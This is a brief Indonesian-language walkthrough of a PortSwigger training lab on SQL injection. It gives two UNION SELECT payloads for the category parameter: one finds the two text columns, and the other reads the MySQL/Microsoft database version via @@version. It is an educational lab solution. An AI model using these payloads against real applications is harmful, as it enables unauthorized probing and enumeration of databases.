# 1. SQL injection attack, querying the database type and version on MySQL and Microsoft

# 2. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

# 3. Penyelesaian

a. Tentukan jumlah kolom yang dikembalikan oleh query dan kolom mana yang berisi data teks.
Verifikasikan bahwa query mengembalikan dua kolom, yang keduanya berisi teks, dengan menggunakan payload ```'+UNION+SELECT+'abc','def'#``` pada parameter kategori

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/279b22e7-585c-427f-b8ee-ab2afa4b1d10" />

b. Kemudian menggunakan payload ini untuk menampilkan versi database ```'+UNION+SELECT+@@version,+NULL#```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/84a3e4f5-3a39-4499-b4ae-d6c149d7c209" />
